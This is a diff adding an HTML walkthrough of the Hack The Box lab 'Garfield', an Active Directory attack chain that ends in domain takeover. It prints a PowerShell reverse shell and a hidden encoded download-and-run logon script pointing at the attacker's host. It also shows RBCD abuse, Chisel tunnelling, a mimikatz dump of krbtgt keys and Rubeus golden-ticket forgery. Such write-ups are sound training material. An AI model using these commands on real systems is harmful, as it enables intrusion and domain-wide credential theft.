@@ -6,77 +6,577 @@
     <title>Garfield • HTB Writeup</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            background: #0b0d15;
-            color: #e0e5f0;
-            font-family: 'Segoe UI', system-ui, sans-serif;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 2rem;
-        }
-        .container {
-            max-width: 800px;
-            width: 100%;
-            background: rgba(12, 16, 28, 0.9);
-            border: 1px solid rgba(0, 255, 200, 0.15);
-            border-radius: 2rem;
-            padding: 3rem;
-            text-align: center;
-            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.7);
-        }
-        h1 {
-            font-size: 2.5rem;
-            color: #6fffe0;
-            margin-bottom: 1rem;
-        }
-        .status {
-            font-size: 1.2rem;
-            color: #b6c8e0;
-            margin: 2rem 0;
-            padding: 1.5rem;
-            background: rgba(255, 200, 0, 0.05);
-            border: 1px solid rgba(255, 200, 0, 0.2);
-            border-radius: 1rem;
-        }
-        .status i {
-            color: #ffcc00;
-            margin-right: 0.5rem;
-        }
-        .back-link {
-            display: inline-block;
-            margin-top: 1.5rem;
-            padding: 0.8rem 2rem;
-            border: 1px solid rgba(0, 255, 200, 0.2);
-            border-radius: 1rem;
-            color: #b6c8e0;
-            text-decoration: none;
-            transition: all 0.3s ease;
-        }
-        .back-link:hover {
-            border-color: #6fffe0;
-            color: #ffffff;
-            transform: translateX(-5px);
-        }
-        .footer {
-            margin-top: 2rem;
-            padding-top: 1.5rem;
-            border-top: 1px solid rgba(0, 255, 200, 0.05);
-            color: #b6c8e0;
-            font-size: 0.8rem;
-            opacity: 0.5;
-        }
+        body { background: #0b0d15; color: #e0e5f0; font-family: 'Segoe UI', system-ui, sans-serif; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 2rem; }
+        .container { max-width: 1200px; width: 100%; background: rgba(12, 16, 28, 0.9); border: 1px solid rgba(0, 255, 200, 0.15); border-radius: 2rem; padding: 3rem; box-shadow: 0 30px 60px rgba(0, 0, 0, 0.7); }
+        h1 { font-size: 2.5rem; color: #6fffe0; margin-bottom: 1.5rem; }
+        h2 { color: #6fffe0; font-size: 1.8rem; margin: 2rem 0 1rem; border-bottom: 1px solid rgba(0, 255, 200, 0.1); padding-bottom: 0.5rem; }
+        h3 { color: #4a9eff; font-size: 1.3rem; margin: 1.5rem 0 0.8rem; }
+        h4 { color: #e0e5f0; font-size: 1.1rem; margin: 1rem 0 0.5rem; }
+        p { color: #b6c8e0; line-height: 1.8; margin-bottom: 1rem; }
+        code { background: rgba(0, 0, 0, 0.4); padding: 0.2rem 0.6rem; border-radius: 0.3rem; font-family: 'Courier New', monospace; color: #6fffe0; }
+        pre { background: rgba(0, 0, 0, 0.4); border: 1px solid rgba(0, 255, 200, 0.1); border-radius: 1rem; padding: 1.5rem; overflow-x: auto; margin: 1rem 0; }
+        pre code { background: transparent; color: #b6c8e0; font-size: 0.85rem; line-height: 1.6; padding: 0; }
+        .meta-info { display: flex; flex-wrap: wrap; gap: 1rem 2rem; padding: 1rem; background: rgba(0, 0, 0, 0.2); border-radius: 1rem; margin-bottom: 2rem; }
+        .meta-info span { color: #b6c8e0; font-size: 0.95rem; }
+        .meta-info strong { color: #e0e5f0; }
+        .box { background: rgba(0, 255, 200, 0.03); border-left: 3px solid #6fffe0; padding: 1rem 1.5rem; border-radius: 0.5rem; margin: 1rem 0; }
+        .box.success { border-left-color: #00ff88; background: rgba(0, 255, 136, 0.03); }
+        .box.warning { border-left-color: #ffcc00; background: rgba(255, 200, 0, 0.03); }
+        .box.danger { border-left-color: #ff4444; background: rgba(255, 68, 68, 0.03); }
+        table { width: 100%; border-collapse: collapse; margin: 1rem 0; }
+        table th, table td { padding: 0.8rem 1rem; border: 1px solid rgba(0, 255, 200, 0.1); text-align: left; color: #b6c8e0; }
+        table th { background: rgba(0, 255, 200, 0.05); color: #6fffe0; }
+        ul { color: #b6c8e0; padding-left: 1.5rem; margin: 0.8rem 0; }
+        ul li { margin-bottom: 0.5rem; line-height: 1.6; }
+        .nav-buttons { display: flex; gap: 1rem; margin-top: 2rem; padding-top: 1.5rem; border-top: 1px solid rgba(0, 255, 200, 0.1); }
+        .nav-buttons a { padding: 0.6rem 1.5rem; border-radius: 0.8rem; text-decoration: none; transition: all 0.3s; }
+        .nav-buttons .back { border: 1px solid rgba(0, 255, 200, 0.15); color: #b6c8e0; }
+        .nav-buttons .back:hover { border-color: #6fffe0; color: #ffffff; }
+        .footer { margin-top: 2rem; padding-top: 1.5rem; border-top: 1px solid rgba(0, 255, 200, 0.05); text-align: center; color: #b6c8e0; font-size: 0.85rem; opacity: 0.5; }
+        .attack-chain { background: rgba(0, 255, 200, 0.02); border: 1px solid rgba(0, 255, 200, 0.1); border-radius: 1rem; padding: 1.5rem; margin: 1rem 0; font-family: 'Courier New', monospace; font-size: 0.85rem; color: #b6c8e0; line-height: 1.8; overflow-x: auto; white-space: pre; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>🚀 HTB Garfield</h1>
-        <div class="status">
-            <i>⚠️</i> Writeup not available yet. Coming soon...
-        </div>
-        <a href="../../writeups.html" class="back-link">← Back to Writeups</a>
-        <div class="footer">NIGHT PULSE X • 2026</div>
+<div class="container">
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Garfield</span>
+        <span><strong>Difficulty:</strong> Hard</span>
+        <span><strong>Platform:</strong> Hack The Box</span>
+        <span><strong>Date:</strong> 11th May 2026</span>
+        <span><strong>Prepared By:</strong> amra</span>
+        <span><strong>Machine Author(s):</strong> amra</span>
     </div>
+
+    <h1>🐱 Garfield - HTB Machine Walkthrough</h1>
+
+    <h2>📋 Table of Contents</h2>
+    <ul>
+        <li><a href="#synopsis" style="color: #6fffe0;">Synopsis</a></li>
+        <li><a href="#phase-1-reconnaissance" style="color: #6fffe0;">Phase 1: Reconnaissance</a></li>
+        <li><a href="#phase-2-initial-enumeration" style="color: #6fffe0;">Phase 2: Initial Enumeration</a></li>
+        <li><a href="#phase-3-dead-ends" style="color: #6fffe0;">Phase 3: Dead Ends</a></li>
+        <li><a href="#phase-4-breakthrough" style="color: #6fffe0;">Phase 4: The Breakthrough</a></li>
+        <li><a href="#phase-5-lateral-movement" style="color: #6fffe0;">Phase 5: Lateral Movement</a></li>
+        <li><a href="#phase-6-privilege-escalation" style="color: #6fffe0;">Phase 6: Privilege Escalation</a></li>
+        <li><a href="#phase-7-domain-takeover" style="color: #6fffe0;">Phase 7: Domain Takeover</a></li>
+        <li><a href="#flags" style="color: #6fffe0;">Flags</a></li>
+        <li><a href="#attack-chain" style="color: #6fffe0;">Attack Chain</a></li>
+        <li><a href="#key-takeaways" style="color: #6fffe0;">Key Takeaways</a></li>
+        <li><a href="#tools-used" style="color: #6fffe0;">Tools Used</a></li>
+    </ul>
+
+    <h2 id="synopsis">📌 Synopsis</h2>
+    <p>Garfield is a Hard-rated Windows machine that simulates a realistic Active Directory environment with a primary Domain Controller (<strong>DC01</strong>) and a Read-Only Domain Controller (<strong>RODC01</strong>). You're handed a set of domain credentials from the start — assume breach, just like a real internal engagement.</p>
+    <p>What looked like a dead end after initial enumeration slowly unraveled into a <strong>6-stage attack chain</strong>: from a logon script nobody was watching, through a password reset chain nobody locked down, to an <strong>RODC Golden Ticket</strong> that collapsed the entire domain's security model.</p>
+
+    <h2 id="phase-1-reconnaissance">🔍 Phase 1: Reconnaissance — "Mapping the Kingdom"</h2>
+
+    <h3>Naabu — First Knock</h3>
+    <pre><code>┌──(root💀kali)-[/home/kali]
+└─# naabu -host 10.129.195.112 -p - -s s -verify 
+
+                  __
+  ___  ___  ___ _/ /  __ __
+ / _ \/ _ \/ _ \/ _ \/ // /
+/_//_/\_,_/\_,_/_.__/\_,_/
+
+                projectdiscovery.io
+
+[INF] Current naabu version 2.5.0 (latest)
+[INF] Running SYN scan with CAP_NET_RAW privileges
+10.129.195.112:5985
+10.129.195.112:445
+10.129.195.112:52113
+10.129.195.112:49673
+10.129.195.112:53
+10.129.195.112:88
+10.129.195.112:49670
+10.129.195.112:593
+10.129.195.112:49674
+10.129.195.112:389
+10.129.195.112:49671
+10.129.195.112:636
+10.129.195.112:3268
+10.129.195.112:49899
+10.129.195.112:3389
+10.129.195.112:2179
+10.129.195.112:3269
+10.129.195.112:9389
+10.129.195.112:49666</code></pre>
+
+    <h3>Nmap — Looking Closer</h3>
+    <p>19 ports came back open. DNS, Kerberos, LDAP, SMB, RPC — the usual suspects for a Domain Controller.</p>
+    <pre><code>┌──(root💀kali)-[/home/kali]
+└─# nmap -sC -sV -Pn -p 53,88,389,445,593,636,2179,3268,3269,3389,5985,9389,49666,49670,49671,49673,49674,49899,52113 10.129.195.112 -T4
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-07 03:49 -0400
+Nmap scan report for garfield.htb (10.129.195.112)
+Host is up (0.26s latency).
+
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-07 15:54:07Z)
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: garfield.htb, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+2179/tcp  open  vmrdp?
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: garfield.htb, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+| ssl-cert: Subject: commonName=DC01.garfield.htb
+| Not valid before: 2026-02-13T01:10:36
+|_Not valid after:  2026-08-15T01:10:36
+| rdp-ntlm-info: 
+|   Target_Name: GARFIELD
+|   NetBIOS_Domain_Name: GARFIELD
+|   NetBIOS_Computer_Name: DC01
+|   DNS_Domain_Name: garfield.htb
+|   DNS_Computer_Name: DC01.garfield.htb
+|   Product_Version: 10.0.17763
+|_  System_Time: 2026-04-07T15:55:01+00:00
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+9389/tcp  open  mc-nmf        .NET Message Framing
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled and required
+|_clock-skew: mean: 8h04m14s, deviation: 0s, median: 8h04m14s</code></pre>
+
+    <p><strong>Key Findings:</strong></p>
+    <ul>
+        <li><strong>Hostname:</strong> <code>DC01.garfield.htb</code></li>
+        <li><strong>OS:</strong> Windows Server 2019 (Build 17763)</li>
+        <li><strong>SMB Signing:</strong> Enabled and required (no relay attacks)</li>
+        <li><strong>Domain:</strong> <code>garfield.htb</code></li>
+    </ul>
+
+    <pre><code>echo "10.129.195.112 garfield.htb DC01.garfield.htb" | sudo tee -a /etc/hosts</code></pre>
+
+    <h2 id="phase-2-initial-enumeration">📊 Phase 2: Initial Enumeration — A Thousand Groups, Zero Paths</h2>
+
+    <h3>The Starting Point</h3>
+    <p><strong>Credentials:</strong> <code>j.arbuckle / Th1sD4mnC4t!@1978</code></p>
+    <pre><code>┌──(root💀kali)-[/home/kali]
+└─# netexec smb 10.129.195.112 -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978'
+SMB         10.129.195.112  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:garfield.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.195.112  445    DC01             [+] garfield.htb\j.arbuckle:Th1sD4mnC4t!@1978</code></pre>
+
+    <h3>SMB — Reading the Signs Wrong</h3>
+    <pre><code>┌──(root💀kali)-[/home/kali]
+└─# netexec smb 10.129.195.112 -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' --shares
+SMB         10.129.195.112  445    DC01             Share           Permissions     Remark
+SMB         10.129.195.112  445    DC01             -----           -----------     ------
+SMB         10.129.195.112  445    DC01             ADMIN$                          Remote Admin
+SMB         10.129.195.112  445    DC01             C$                              Default share
+SMB         10.129.195.112  445    DC01             IPC$            READ            Remote IPC
+SMB         10.129.195.112  445    DC01             NETLOGON        READ            Logon server share 
+SMB         10.129.195.112  445    DC01             SYSVOL          READ            Logon server share</code></pre>
+
+    <div class="box warning">
+        <p><strong>⚠️ Critical Mistake:</strong> <code>netexec --shares</code> only shows <strong>share-level</strong> permissions, not <strong>NTFS-level</strong> permissions. The <code>scripts</code> subfolder inside SYSVOL could have writable NTFS ACLs — and it did.</p>
+    </div>
+
+    <h3>Domain Users — Familiar Faces</h3>
+    <pre><code>┌──(root💀kali)-[/home/kali]
+└─# netexec smb 10.129.195.112 -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' --users
+SMB         10.129.195.112  445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-
+SMB         10.129.195.112  445    DC01             Administrator                 2025-10-03 17:29:26 0       Built-in account for administering the computer/domain
+SMB         10.129.195.112  445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain
+SMB         10.129.195.112  445    DC01             krbtgt                        2025-08-13 11:05:26 0       Key Distribution Center Service Account
+SMB         10.129.195.112  445    DC01             krbtgt_8245                   2025-08-17 11:33:39 0       Key Distribution Center service account for read-only domain controller
+SMB         10.129.195.112  445    DC01             j.arbuckle                    2025-09-09 15:50:55 0
+SMB         10.129.195.112  445    DC01             l.wilson                      2026-01-27 21:40:33 0
+SMB         10.129.195.112  445    DC01             l.wilson_adm                  2026-01-13 14:56:35 0</code></pre>
+
+    <p><strong>Observations:</strong></p>
+    <ul>
+        <li><strong>krbtgt_8245</strong> — RODC-specific KDC account</li>
+        <li><strong>l.wilson</strong> and <strong>l.wilson_adm</strong> — regular user and privileged counterpart (admin tiering)</li>
+    </ul>
+
+    <h3>SYSVOL — A Script Hiding in Plain Sight</h3>
+    <pre><code>┌──(root💀kali)-[/home/kali]
+└─# smbclient //10.129.195.112/SYSVOL -U 'j.arbuckle%Th1sD4mnC4t!@1978' -c 'recurse ON; prompt OFF; ls'
+
+\garfield.htb\scripts
+  .                                   D        0  Tue Jan 27 17:13:47 2026
+  ..                                  D        0  Tue Jan 27 17:13:47 2026
+  printerDetect.bat                   A      217  Fri Sep 12 18:20:29 2025</code></pre>
+
+    <pre><code>┌──(root💀kali)-[/home/kali]
+└─# cat printerDetect.bat
+@echo off
+echo Detecting installed printers...
+echo ==============================
+
+wmic printer get Name,DeviceID,PortName,DriverName,Shared,Status /format:table
+
+echo.
+echo Printer detection completed.
+pause</code></pre>
+
+    <p>A harmless-looking logon script. Nothing sensitive — no hardcoded credentials, no UNC paths. I almost dismissed it entirely.</p>
+
+    <h3>BloodHound — The Tool That Lied by Omission</h3>
+    <pre><code>┌──(root💀kali)-[/home/kali]
+└─# bloodhound-python -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' -d garfield.htb -ns 10.129.195.112 -c all --dns-tcp
+INFO: Found 1 domains
+INFO: Found 2 computers
+INFO: Found 8 users
+INFO: Found 55 groups
+INFO: Found 2 gpos
+INFO: Querying computer: RODC01.garfield.htb
+INFO: Querying computer: DC01.garfield.htb</code></pre>
+
+    <p><strong>BloodHound Results for j.arbuckle:</strong></p>
+    <ul>
+        <li>Member of: <code>Users</code>, <code>Domain Users</code>, <code>IT Support</code></li>
+        <li>Admin Count: <code>FALSE</code></li>
+        <li>Local Admin Privileges: <code>0</code></li>
+        <li>Execution Privileges: <code>0</code></li>
+        <li>Outbound Object Control: <code>0</code></li>
+        <li>Path to Domain Admins: <strong>"Path not found."</strong></li>
+    </ul>
+
+    <div class="box warning">
+        <p><strong>What I didn't know yet:</strong> BloodHound enumerates ACLs at the <strong>object level</strong>, not the <strong>attribute level</strong>. j.arbuckle had write access to exactly one attribute on l.wilson: <strong><code>scriptPath</code></strong>. And that one attribute was enough to compromise the entire domain.</p>
+    </div>
+
+    <h2 id="phase-3-dead-ends">🚫 Phase 3: Dead Ends — Chasing Ghosts in the Domain</h2>
+
+    <h3>AS-REP Roasting — Nobody Home</h3>
+    <pre><code>┌──(root💀kali)-[/home/kali]
+└─# impacket-GetNPUsers garfield.htb/ -usersfile users.txt -dc-ip 10.129.195.112 -no-pass
+[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User j.arbuckle doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User l.wilson doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User l.wilson_adm doesn't have UF_DONT_REQUIRE_PREAUTH set</code></pre>
+
+    <h3>Kerberoasting — Still Nothing</h3>
+    <pre><code>┌──(root💀kali)-[/home/kali]
+└─# impacket-GetUserSPNs garfield.htb/j.arbuckle:'Th1sD4mnC4t!@1978' -dc-ip 10.129.195.112
+No entries found!</code></pre>
+
+    <h3>PetitPotam — A Tempting Mirage</h3>
+    <pre><code>┌──(root💀kali)-[/home/kali]
+└─# python3 /home/kali/PetitPotam/PetitPotam.py 10.10.14.42 10.129.195.112 -u j.arbuckle -p 'Th1sD4mnC4t!@1978'
+[+] Connected!
+[+] Successfully bound!
+[-] Sending EfsRpcOpenFileRaw!
+[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
+[+] OK! Using unpatched function!
+[-] Sending EfsRpcEncryptFileSrv!
+[+] Got expected ERROR_BAD_NETPATH exception!!
+[+] Attack worked!</code></pre>
+
+    <p><strong>Relay failed:</strong></p>
+    <pre><code>[!] The client requested signing. Relaying to LDAP will not work!
+[-] (SMB): Authenticating against ldap://10.129.195.112 as GARFIELD/DC01$ FAILED</code></pre>
+
+    <h3>Password Spraying — Into the Void</h3>
+    <pre><code>┌──(root💀kali)-[/home/kali]
+└─# netexec smb 10.129.195.112 -u users.txt -p 'Th1sD4mnC4t!@1978' --continue-on-success
+SMB         10.129.195.112  445    DC01             [+] garfield.htb\j.arbuckle:Th1sD4mnC4t!@1978
+SMB         10.129.195.112  445    DC01             [-] garfield.htb\l.wilson:Th1sD4mnC4t!@1978 STATUS_LOGON_FAILURE
+SMB         10.129.195.112  445    DC01             [-] garfield.htb\l.wilson_adm:Th1sD4mnC4t!@1978 STATUS_LOGON_FAILURE</code></pre>
+
+    <div class="box warning">
+        <p><strong>All dead ends.</strong> The domain was hardened, my user appeared powerless, and BloodHound was blind.</p>
+    </div>
+
+    <h2 id="phase-4-breakthrough">💡 Phase 4: The Breakthrough — What BloodHound Couldn't See</h2>
+
+    <h3>bloodyAD — Reading the Fine Print</h3>
+    <pre><code>┌──(root💀kali)-[/home/kali]
+└─# bloodyAD -u j.arbuckle -p 'Th1sD4mnC4t!@1978' -d garfield.htb --host 10.129.195.112 get writable --detail</code></pre>
+
+    <p><strong>Buried in the output:</strong></p>
+    <pre><code>distinguishedName: CN=Liz Wilson,CN=Users,DC=garfield,DC=htb
+scriptPath: WRITE
+
+distinguishedName: CN=Liz Wilson ADM,CN=Users,DC=garfield,DC=htb
+scriptPath: WRITE</code></pre>
+
+    <div class="box success">
+        <p><strong>j.arbuckle had write access to <code>scriptPath</code> on l.wilson and l.wilson_adm.</strong> This was the edge BloodHound couldn't see — a single attribute-level write permission completely invisible to both Legacy and Community Edition.</p>
+    </div>
+
+    <h2 id="phase-5-lateral-movement">🔄 Phase 5: Lateral Movement — From Script to Shell</h2>
+
+    <h3>Weaponizing SYSVOL</h3>
+    <p>I created a two-stage payload:</p>
+
+    <p><strong>1. Reverse shell script (<code>shell.ps1</code>):</strong></p>
+    <pre><code>$client = New-Object System.Net.Sockets.TCPClient("10.10.14.42",443);
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535|%{0};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
+    $sendback = (iex $data 2>&1 | Out-String);
+    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+    $stream.Write($sendbyte,0,$sendbyte.Length);
+    $stream.Flush()
+};
+$client.Close()</code></pre>
+
+    <p><strong>2. .bat wrapper (<code>printerDetect.bat</code>):</strong></p>
+    <pre><code>PAYLOAD="IEX(New-Object Net.WebClient).downloadString('http://10.10.14.42:8000/shell.ps1')"
+ENCODED=$(echo -n "$PAYLOAD" | iconv -t UTF-16LE | base64 -w0)
+echo "@echo off" > printerDetect.bat
+echo "powershell -nop -w hidden -enc $ENCODED" >> printerDetect.bat</code></pre>
+
+    <p><strong>3. Upload to SYSVOL:</strong></p>
+    <pre><code>┌──(root💀kali)-[/home/kali]
+└─# smbclient //10.129.195.112/SYSVOL -U 'j.arbuckle%Th1sD4mnC4t!@1978' -c 'cd garfield.htb\scripts\; put printerDetect.bat'
+putting file printerDetect.bat as \garfield.htb\scripts\printerDetect.bat (0.2 kB/s) (average 0.2 kB/s)</code></pre>
+
+    <div class="box success">
+        <p><strong>✅ Writable!</strong> This folder had been writable the entire time.</p>
+    </div>
+
+    <h3>Catching the Shell</h3>
+    <pre><code>┌──(root💀kali)-[/home/kali]
+└─# bloodyAD -u j.arbuckle -p 'Th1sD4mnC4t!@1978' -d garfield.htb --host 10.129.195.112 set object l.wilson scriptPath -v 'printerDetect.bat'
+[+] l.wilson's scriptPath has been updated</code></pre>
+
+    <p><strong>Listener catches the shell:</strong></p>
+    <pre><code>┌──(root💀kali)-[/home/kali]
+└─# nc -lvnp 443
+listening on [any] 443 ...
+connect to [10.10.14.42] from (UNKNOWN) [10.129.195.112] 63991
+whoami
+garfield\l.wilson
+PS C:\Windows\system32></code></pre>
+
+    <h3>ForceChangePassword — One Account Leads to Another</h3>
+    <pre><code>PS C:\Windows\system32> $newpass = ConvertTo-SecureString 'WhoKnows123!' -AsPlainText -Force
+PS C:\Windows\system32> Set-ADAccountPassword -Identity l.wilson_adm -NewPassword $newpass -Reset</code></pre>
+
+    <pre><code>┌──(root💀kali)-[/home/kali]
+└─# evil-winrm -i 10.129.195.112 -u 'l.wilson_adm' -p 'WhoKnows123!'
+*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> type C:\Users\l.wilson_adm\Desktop\user.txt
+8a65a7bc************************</code></pre>
+
+    <h2 id="phase-6-privilege-escalation">⬆️ Phase 6: Privilege Escalation — Climbing the RODC Ladder</h2>
+
+    <h3>AddSelf — Joining the Inner Circle</h3>
+    <p><strong>BloodHound showed:</strong> l.wilson_adm had <code>AddSelf</code> on the <code>RODC Administrators</code> group.</p>
+    <pre><code>*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> Add-ADGroupMember -Identity "RODC Administrators" -Members l.wilson_adm</code></pre>
+
+    <p><strong>RODC01 is on an internal network:</strong></p>
+    <pre><code>*Evil-WinRM* PS> nslookup RODC01.garfield.htb
+Name:    RODC01.garfield.htb
+Address:  192.168.100.2</code></pre>
+
+    <h3>RBCD — Faking Trust</h3>
+    <p><strong>1. Create fake machine account:</strong></p>
+    <pre><code>┌──(root💀kali)-[/home/kali]
+└─# impacket-addcomputer garfield.htb/l.wilson_adm:'WhoKnows123!' -computer-name 'YOURPC$' -computer-pass 'Password123!' -dc-ip 10.129.195.112
+[*] Successfully added machine account YOURPC$ with password Password123!.</code></pre>
+
+    <p><strong>2. Configure RBCD delegation:</strong></p>
+    <pre><code>┌──(root💀kali)-[/home/kali]
+└─# impacket-rbcd garfield.htb/l.wilson_adm:'WhoKnows123!' -delegate-from 'YOURPC$' -delegate-to 'RODC01$' -action write -dc-ip 10.129.195.112
+[*] Delegation rights modified successfully!</code></pre>
+
+    <p><strong>3. Request service ticket (after syncing time):</strong></p>
+    <pre><code>┌──(root💀kali)-[/home/kali]
+└─# ntpdate -b 10.129.195.112
+2026-04-07 23:46:55.049044 (-0400) +29057.094492 +/- 0.170469 10.129.195.112 s1 no-leap
+
+┌──(root💀kali)-[/home/kali]
+└─# impacket-getST garfield.htb/'YOURPC$':'Password123!' -spn cifs/RODC01.garfield.htb -impersonate Administrator -dc-ip 10.129.195.112
+[*] Impersonating Administrator
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache</code></pre>
+
+    <h3>Chisel — Tunneling Into the Inner Network</h3>
+    <p><strong>Download Chisel to DC01:</strong></p>
+    <pre><code>*Evil-WinRM* PS> certutil -urlcache -split -f http://10.10.14.42:9000/chisel.exe C:\Users\l.wilson_adm\Documents\chisel.exe</code></pre>
+
+    <p><strong>Start Chisel server on Kali:</strong></p>
+    <pre><code>┌──(root💀kali)-[/home/kali]
+└─# chisel server --reverse -p 8001
+2026/04/07 23:50:52 server: Reverse tunnelling enabled
+2026/04/07 23:50:52 server: Listening on http://0.0.0.0:8001</code></pre>
+
+    <p><strong>Start Chisel client on DC01:</strong></p>
+    <pre><code>*Evil-WinRM* PS> .\chisel.exe client 10.10.14.42:8001 R:socks
+2026/04/07 21:05:04 client: Connected (Latency 339.2648ms)</code></pre>
+
+    <p><strong>SOCKS proxy live on port 1080.</strong></p>
+
+    <h3>psexec into RODC01</h3>
+    <pre><code>┌──(root💀kali)-[/home/kali]
+└─# export KRB5CCNAME=Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache
+
+┌──(root💀kali)-[/home/kali]
+└─# proxychains impacket-psexec garfield.htb/Administrator@RODC01.garfield.htb -k -no-pass -dc-ip 10.129.195.112 -target-ip 192.168.100.2
+[*] Found writable share ADMIN$
+[*] Uploading file KThCwazW.exe
+[*] Creating service LPBx on 192.168.100.2.....
+[*] Starting service LPBx.....
+
+C:\Windows\system32> whoami
+nt authority\system</code></pre>
+
+    <h3>Mimikatz — Dumping the RODC's Secrets</h3>
+    <pre><code>┌──(root💀kali)-[/home/kali]
+└─# proxychains impacket-smbclient garfield.htb/Administrator@RODC01.garfield.htb -k -no-pass -dc-ip 10.129.195.112 -target-ip 192.168.100.2
+# use C$
+# cd Windows\Temp
+# put /home/kali/mimikatz.exe</code></pre>
+
+    <pre><code>C:\Windows\system32> C:\Windows\Temp\mimikatz.exe
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # lsadump::lsa /inject /name:krbtgt_8245
+Domain : GARFIELD / S-1-5-21-2502726253-3859040611-225969357
+RID  : 00000643 (1603)
+User : krbtgt_8245
+
+ * Primary
+    NTLM : 445aa4221e751da37a10241d962780e2
+
+ * Kerberos-Newer-Keys
+    aes256_hmac       (4096) : d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240
+    aes128_hmac       (4096) : 124c0fd09f5fa4efca8d9f1da91369e5
+    des_cbc_md5       (4096) : d540fe6192b9ecfe</code></pre>
+
+    <h2 id="phase-7-domain-takeover">👑 Phase 7: Domain Takeover — The Golden Ticket That Wasn't Read-Only</h2>
+
+    <h3>Rewriting the Rules — Password Replication Policy</h3>
+    <p><strong>RODC Golden Ticket requires PRP modification.</strong> By default, Administrator is in the <strong>deny list</strong> (<code>msDS-NeverRevealGroup</code>).</p>
+
+    <p><strong>Clear the deny list first:</strong></p>
+    <pre><code>┌──(root💀kali)-[/home/kali]
+└─# bloodyAD -u l.wilson_adm -p 'WhoKnows123!' -d garfield.htb --host 10.129.195.189 set object 'RODC01$' msDS-NeverRevealGroup -v ""
+[+] RODC01$'s msDS-NeverRevealGroup has been updated</code></pre>
+
+    <p><strong>Add Administrator to allow list:</strong></p>
+    <pre><code>┌──(root💀kali)-[/home/kali]
+└─# bloodyAD -u l.wilson_adm -p 'WhoKnows123!' -d garfield.htb --host 10.129.195.189 set object 'RODC01$' msDS-RevealOnDemandGroup -v 'CN=Administrator,CN=Users,DC=garfield,DC=htb'
+[+] RODC01$'s msDS-RevealOnDemandGroup has been updated</code></pre>
+
+    <h3>Rubeus — Forging the Ticket</h3>
+    <div class="box warning">
+        <p><strong>⚠️ Important:</strong> Rubeus v2.2.0 has a bug in RODC Golden Ticket implementation → <code>KRB_AP_ERR_BAD_INTEGRITY</code>. Use <strong>v2.3.3</strong> or newer.</p>
+    </div>
+
+    <p><strong>Forge RODC Golden Ticket with Rubeus v2.3.3:</strong></p>
+    <pre><code>*Evil-WinRM* PS> .\Rubeus_new.exe golden /rodcNumber:8245 /aes256:d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240 /user:Administrator /id:500 /domain:garfield.htb /sid:S-1-5-21-2502726253-3859040611-225969357 /outfile:C:\Users\l.wilson_adm\Documents\rodc_golden_new.kirbi
+[*] Forged a TGT for 'Administrator@garfield.htb'
+[*] Ticket written to rodc_golden_new_2026_04_08_17_26_50_Administrator_to_krbtgt@GARFIELD.HTB.kirbi</code></pre>
+
+    <p><strong>Request TGS for CIFS on DC01:</strong></p>
+    <pre><code>*Evil-WinRM* PS> .\Rubeus_new.exe asktgs /ticket:C:\Users\l.wilson_adm\Documents\rodc_golden_new_2026_04_08_17_26_50_Administrator_to_krbtgt@GARFIELD.HTB.kirbi /service:cifs/DC01.garfield.htb /dc:DC01.garfield.htb /ptt
+[+] TGS request successful!</code></pre>
+
+    <h3>psexec — Walking Through</h3>
+    <pre><code>┌──(root💀kali)-[/home/kali]
+└─# echo <base64_ticket> | base64 -d > /home/kali/tgs.kirbi
+
+┌──(root💀kali)-[/home/kali]
+└─# impacket-ticketConverter /home/kali/tgs.kirbi /home/kali/tgs.ccache
+[*] converting kirbi to ccache...
+[+] done
+
+┌──(root💀kali)-[/home/kali]
+└─# export KRB5CCNAME=/home/kali/tgs.ccache
+
+┌──(root💀kali)-[/home/kali]
+└─# impacket-psexec garfield.htb/Administrator@DC01.garfield.htb -k -no-pass
+Microsoft Windows [Version 10.0.17763.8385]
+C:\Windows\system32> whoami
+nt authority\system
